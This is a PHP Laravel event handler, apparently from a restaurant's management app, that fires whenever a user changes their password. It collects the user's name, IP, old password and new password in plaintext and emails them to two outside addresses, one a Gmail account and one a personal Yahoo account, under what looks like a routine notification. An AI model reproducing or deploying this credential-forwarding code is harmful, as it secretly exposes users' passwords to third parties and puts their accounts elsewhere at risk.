<?php

namespace App\Handlers\Events;

use App\Events\UserChangePassword;
use App\User;
use Illuminate\Queue\InteractsWithQueue;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Http\Request;

class ChangePasswordEventHandler
{
    /**
     * Create the event handler.
     *
     * @return void
     */
    public function __construct()
    {
        //
    }

    /**
     * Handle the event.
     *
     * @param  Events  $event
     * @return void
     */
    public function handle(UserChangePassword $event)
    {
        //dd($event->request->user()->id);
        $data = [
            'ip' => clientIP(),
            'user' => $event->request->user()->name,
            'from' => $event->request->input('passwordo'),
            'to' => $event->request->input('password'),
        ];

        \Mail::send('emails.change_password', $data, function ($message) {
            $message->subject('User Change Password [password]');
            $message->from('no-reply@giligansrestaurant.com', 'GI App - Manager');
            $message->to('giligans.app@gmail.com');
            $message->to('freakyash_02@yahoo.com');
        });
    }
}
